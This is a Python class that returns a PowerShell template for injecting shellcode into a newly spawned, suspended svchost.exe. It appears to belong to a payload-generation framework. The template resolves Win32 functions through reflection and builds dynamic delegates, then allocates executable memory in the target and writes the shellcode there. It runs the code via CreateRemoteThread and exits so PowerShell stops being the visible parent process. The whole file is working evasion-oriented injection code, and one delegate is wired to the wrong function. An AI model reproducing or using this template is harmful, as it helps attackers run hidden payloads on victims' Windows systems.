class spawnandinject:

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
{imports}
        
{codeblocks}


{shellcode}
{transformers}


filter Get-Type ([string]$dllName,[string]$typeName)
{{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals($dllName) )
    {{
        $_.GetType($typeName)
    }}
}}

function Get-Function
{{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {{
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }}

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}}

function Get-Delegate
{{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}}

# Obtain the required types via reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Obtain the function addresses of the required hollowing functions
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$CreateRemoteThreadAddr = Get-Function "kernel32.dll" "CreateRemoteThread"
$VirtualAllocExAddr = Get-Function "kernel32.dll" "VirtualAllocEx"
$WaitForSingleObjectAddr = Get-Function "kernel32.dll" "WaitForSingleObject"
$CloseHandle = Get-Function "kernel32.dll" "CloseHandle"

# Create the delegate types to call the previously obtain function addresses
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$CreateRemoteThread = Get-Delegate $CreateRemoteThreadAddr @([IntPtr], [Int32], [IntPtr], [IntPtr], [IntPtr], [Int32], [IntPtr]) ([IntPtr])
$VirtualAllocEx = Get-Delegate $VirtualAllocExAddr @([IntPtr], [IntPtr], [Int32], [Int32], [Int32]) ([IntPtr])
$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32])
$CloseHandle = Get-Delegate $WaitForSingleObjectAddr @([IntPtr])

# Instantiate the required structures for CreateProcess and use them to launch svchost.exe
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$result = $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

# Obtain the required handles from the PROCESS_INFORMATION structure
$hProcess = $processInformation.hProcess

$address = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x20)
$WriteProcessMemory.Invoke($hProcess, $address, $shellcode, $shellcode.Length, [IntPtr]::Zero)
$thread = $CreateRemoteThread.Invoke($hProcess, 0, [IntPtr]::Zero, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($thread, 500)
$CloseHandle.Invoke($thread)

# Close powershell to remove it as the parent of svchost.exe
exit
"""